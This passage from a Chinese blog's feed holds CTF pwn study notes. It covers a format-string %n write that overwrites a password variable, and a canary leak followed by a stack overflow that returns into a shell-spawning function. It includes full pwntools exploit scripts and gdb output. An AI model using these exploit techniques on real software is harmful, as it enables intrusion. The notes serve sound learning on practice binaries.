&lt;p&gt;2.找到这个地址在栈中的位置,需要移动多少个位置能到这里&lt;/p&gt;
&lt;p&gt;3.利用%n随便写入一个值即可&lt;/p&gt;
&lt;p&gt;4.passwd输入对应的值即可&lt;/p&gt;
&lt;p&gt;​		首先,要修改的值的地址就是0x804c044,第一个问题解决.这个是因为ida在命名的时候如果没有符号表会用地址之类的命名,所以可以直接看出来..bss:0804C044 unk_804C044&lt;/p&gt;
&lt;p&gt;​		它的逻辑就是从&amp;#x2F;dev&amp;#x2F;urandom读取一个值到这个地址&lt;/p&gt;
&lt;h2 id=&#34;寻找写入位置&#34;&gt;&lt;a href=&#34;#寻找写入位置&#34; class=&#34;headerlink&#34; title=&#34;寻找写入位置&#34;&gt;&lt;/a&gt;寻找写入位置&lt;/h2&gt;&lt;p&gt;寻找地址在栈中的位置可以进行尝试,或者利用gdb调试查看&lt;/p&gt;
&lt;p&gt;pwndbg&amp;gt; r&lt;br&gt;Starting program: &amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;str&amp;#x2F;pwn5&amp;#x2F;pwn&lt;br&gt;your name:aaaaaa%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x&lt;br&gt;Hello,aaaaaaffffd548.63.0.f7ffda9c.3.f7fd0410.1.0.1.61616161.78256161.2e78252e.252e7825&lt;/p&gt;
&lt;p&gt;可以看到,是第10个,&lt;/p&gt;
&lt;p&gt;或者利用aaaa%10$x 来一个一个尝试            数字和$的组合代表了查看第几个值&lt;/p&gt;
&lt;p&gt;your name:aaaa%10$x&lt;br&gt;Hello,aaaa61616161&lt;/p&gt;
&lt;h2 id=&#34;写入具体的值&#34;&gt;&lt;a href=&#34;#写入具体的值&#34; class=&#34;headerlink&#34; title=&#34;写入具体的值&#34;&gt;&lt;/a&gt;写入具体的值&lt;/h2&gt;&lt;p&gt;所以可以用&lt;/p&gt;
&lt;p&gt;p32(0x804c044) + b”%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%n” 将值写入,写入的值的大小是&lt;/p&gt;
&lt;p&gt;6+8+9*8 &amp;#x3D; 86&lt;/p&gt;
&lt;p&gt;算的不对,可以在调试的时候检查一下&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/wx &lt;span class=&#34;number&#34;&gt;0x804c044&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804c044&lt;/span&gt;:      &lt;span class=&#34;number&#34;&gt;0x0000004c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;0x4 &amp;#x3D; 76&lt;/p&gt;
&lt;p&gt;6 + 4 + 8*8 &amp;#x3D; 76  6是hello,  4是p32()  32位,四个字节&lt;/p&gt;
&lt;h2 id=&#34;passwd输入对应的值&#34;&gt;&lt;a href=&#34;#passwd输入对应的值&#34; class=&#34;headerlink&#34; title=&#34;passwd输入对应的值&#34;&gt;&lt;/a&gt;passwd输入对应的值&lt;/h2&gt;&lt;p&gt;直接输入对应的数字即可 记得是biniay类型的&lt;/p&gt;
&lt;p&gt;atoi函数会把字符转化成整数,但直接输入binary的数字也可以&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(io,&lt;span class=&#34;string&#34;&gt;&amp;quot;break main&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p32(&lt;span class=&#34;number&#34;&gt;0x804c044&lt;/span&gt;) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;passwd:&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;76&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;去除调试信息版本,记得这里修改payload后,passwd的长度也变了,这里就只有p32的长度&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;node4.buuoj.cn&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;25184&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p32(&lt;span class=&#34;number&#34;&gt;0x804c044&lt;/span&gt;) + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;%10$n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;name:&amp;#x27;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;passwd:&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;4&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;总结&#34;&gt;&lt;a href=&#34;#总结&#34; class=&#34;headerlink&#34; title=&#34;总结&#34;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;1.虽然开了NX和canary保护,但是不用栈溢出,所以不影响.这里不溢出的一个关键点大概是 name给的大小足够大?如果给小了可能是另外的了?&lt;/p&gt;
&lt;h1 id=&#34;hitcon-cmt-2017-pwn200&#34;&gt;&lt;a href=&#34;#hitcon-cmt-2017-pwn200&#34; class=&#34;headerlink&#34; title=&#34;hitcon cmt 2017 pwn200&#34;&gt;&lt;/a&gt;hitcon cmt 2017 pwn200&lt;/h1&gt;&lt;p&gt;题目给了源码&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;canary_protect_me&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    system(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setvbuf(&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setvbuf(&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gets(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gets(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;编译:gcc -m32 -z lazy -z nonexecstack -fstack-protector -no-pie pwn200.c -o pwn200&lt;/p&gt;
&lt;p&gt;存在栈溢出,但是有保护nx和canary, 思路大概是覆盖返回地址为canary_protect_me,覆盖谁的返回地址呢?覆盖下一个gets的?不是这个逻辑,它还没有调用,没有返回值,那就是覆盖main函数的?&lt;/p&gt;
&lt;p&gt;正确的逻辑是 泄露canary然后栈溢出覆盖返回值&lt;/p&gt;
&lt;p&gt;所以问题是canary在哪?  这两句,第一句把canary赋值给eax然后赋值给 ebp -0xc | 回头专门研究下canary&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804859e&lt;/span&gt; &amp;lt;main+&lt;span class=&#34;number&#34;&gt;29&lt;/span&gt;&amp;gt;    mov    eax, dword ptr gs:[&lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x80485a4&lt;/span&gt; &amp;lt;main+&lt;span class=&#34;number&#34;&gt;35&lt;/span&gt;&amp;gt;    mov    dword ptr [ebp - &lt;span class=&#34;number&#34;&gt;0xc&lt;/span&gt;], eax&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;所以我们需要泄露 ebp - 0xc这个位置的值,然后就可以溢出,覆盖返回地址就可以了,但是调用printf的时候,ebp不会改变吗???&lt;/p&gt;
&lt;p&gt;调试一下看看,不会…为啥呢?&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;一开始canary的位置  &lt;span class=&#34;number&#34;&gt;0xffffd5bc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0b&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;002&lt;/span&gt;c│     &lt;span class=&#34;number&#34;&gt;0xffffd5bc&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x50b7d500&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;c:&lt;span class=&#34;number&#34;&gt;0030&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd5c0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0xffffd5e0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;d:&lt;span class=&#34;number&#34;&gt;0034&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd5c4&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;e:&lt;span class=&#34;number&#34;&gt;0038&lt;/span&gt;│ ebp &lt;span class=&#34;number&#34;&gt;0xffffd5c8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;和esp差了15个?&lt;/p&gt;
&lt;p&gt;payload1  %15$x&lt;/p&gt;
&lt;p&gt;然后栈溢出覆盖返回地址为canary_protect_me的            0x8048556 (p canary_protect_me 打印即可) 0x80491a2&lt;/p&gt;
&lt;p&gt;payload2 40*’a’ + canary + 12 * ‘b’ + p32(0x8048556)&lt;/p&gt;
&lt;p&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccccccccccddddeeeeeeeeeeeeeeee&lt;/p&gt;
&lt;p&gt;这里有一个细节点,就是怎么正确接收canary,然后拼接上&lt;/p&gt;
&lt;p&gt;是地址对其的问题吗?? 一直不成功&lt;/p&gt;
&lt;p&gt;但是为什么用官方给的文件就可以??     &lt;a href=&#34;https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/61&#34;&gt;https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/61&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;  是编译器的问题吗…调试一下看看&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#r = remote(&amp;#x27;bamboofox.cs.nctu.edu.tw&amp;#x27;,22002)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./binary_200&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;func = &lt;span class=&#34;number&#34;&gt;0x0804854d&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%15$x&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canary = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(r.recv(), &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;A&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt; + p32(canary) + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;B&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt; + p32(func)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;这边联动pwntools调试也有问题…研究一下&lt;/p&gt;
&lt;p&gt;正确的应该是这样&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218143500025.png&#34; alt=&#34;image-20230218143500025&#34;&gt;&lt;/p&gt;
&lt;p&gt;不行的exp和这个感觉没啥区别,但是最后报错了&amp;lt;Could not read memory at 0x4242423e&amp;gt;&lt;/p&gt;
&lt;p&gt;返回地址那里的问题感觉是&lt;/p&gt;
&lt;p&gt;这个是有问题的,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144242002.png&#34; alt=&#34;image-20230218144242002&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144611364.png&#34; alt=&#34;image-20230218144611364&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个是正常的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144322352.png&#34; alt=&#34;image-20230218144322352&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144344172.png&#34; alt=&#34;image-20230218144344172&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144519430.png&#34; alt=&#34;image-20230218144519430&#34;&gt;&lt;/p&gt;
&lt;p&gt;文件已保存…后面可以再检查下……&lt;/p&gt;
&lt;h1 id=&#34;hitcon-cmt-2017-pwn300&#34;&gt;&lt;a href=&#34;#hitcon-cmt-2017-pwn300&#34; class=&#34;headerlink&#34; title=&#34;hitcon cmt 2017 pwn300&#34;&gt;&lt;/a&gt;hitcon cmt 2017 pwn300&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/62&#34;&gt;https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/62&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-02-17T03:02:28.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/</id>
